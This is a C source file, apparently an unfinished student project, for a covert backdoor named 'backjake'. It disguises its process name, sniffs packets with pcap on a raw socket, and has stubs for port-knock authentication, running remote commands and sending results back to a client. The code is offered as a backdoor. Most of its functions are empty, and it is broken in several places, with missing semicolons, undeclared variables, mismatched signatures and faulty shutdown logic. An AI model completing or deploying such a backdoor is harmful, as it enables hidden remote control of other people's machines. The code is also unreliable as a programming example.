#include "backjake.h"

static sigjmp_buf jmpbuf;
static volatile sig_atomic_t canjump;
pthread_mutex_t ThreadLock = PTHREAD_MUTEX_INITIALIZER;
int running = 1;

int main(int argc, char** argv)
{
    AddrInfo *Addr_Ptr;
    PcapInfo *pcap_ptr;
    int opt;
    pthread_t ThreadID, ThreadID2;
    char *nic_dev; 
    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 maskp;          // subnet mask    
    unsigned int iseed = (unsigned int)time(NULL);    // use the current time as the random seed value

    disguise();
    checkArgs();
    initializeDoor();
    setConfig();
    initializePcap();
    initializeSocket();
    setupSignals();

    //authenticateClient();
    pthread_create (&ThreadID2, NULL, ReceiveDatagram, (void *)pcap_ptr);
    pthread_join (ThreadID2, NULL);

    free (Addr_Ptr);
    free (pcap_ptr);
    return 0;
}

void initializeSocket()
{
    int arg;
    Addr_Ptr->RawSocket = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    
    arg = 1;
    if (setsockopt (Addr_Ptr->RawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1) 
        perror("setsockopt");
}

void initializePcap()
{
    if ((pcap_ptr = malloc (sizeof (PcapInfo))) == NULL)
    {
        perror ("malloc");
        exit (1);
    }
    nic_dev = "p2p1"; // CHANGE
    pcap_lookupnet (nic_dev, &pcap_ptr->netp, &maskp, errbuf);
    pcap_ptr->nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
    
    if (pcap_ptr->nic_descr == NULL)
    { 
        printf("pcap_open_live(): %s\n",errbuf); 
        exit(1); 
    }

    snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), CMD, Addr_Ptr->DstHost, Addr_Ptr->dport);
}

void initializeDoor()
{
    // seed random number generator
    srand(iseed)

    // set defaults
    Addr_Ptr->SrcHost = GetIPAddress ();    // Default Source IP
    Addr_Ptr->DstHost = NULL;           // Must be specified by user!
    Addr_Ptr->dport = DEFAULT_DST_PORT;     // Default Destination Port
    Addr_Ptr->sport = rand()% 40000 + 2000; // Default (Random) Source Port between 2000 and 60000
}

void checkArgs(int argc, int **argv)
{
    if (argc < 2)
    {
        usage(argv);
    }
}

void usage(char ** argv)
{
    printf("you done goofed!\n")
    printf("try again!\n");
}

void setupSignals()
{
    if (signal(SIGALRM, unlock) == SIG_ERR)
        perror("signal(SIGALRM) error");

    if (signal(SIGINT, endProgram) == SIG_ERR)
        perror("signal(SIGINT) error");    
}

void authenticateClient()
{
    // NOT YET IMPLEMENTED

    //pthread_create(&ThreadID, NULL, knockListener, (void*)Addr_Ptr);
    
    // spawn knock code listener
    // while getting commands
    //          execute command
    //          spawn result thread, pipe in results
}

static void endProgram (int signo)
{
    // stop the program
    running = 1;
}

static void unlock (int signo)
{
    if (canjump == 0)
        return;

    pthread_mutex_unlock (&ThreadLock);
    siglongjmp (jmpbuf, 1);
}

void* knockListener(void* pcap_arg)
{
    // NOT YET IMPLEMENTED
    //
}

void executeCommand()
{
    spawnThread();
}

void spawnThread()
{
    // send results to client
}

void setConfig()
{
    char* options = "";
    options = readConfigFile();
}

char* readConfigFile()
{
    char* options = "";

    return options;
}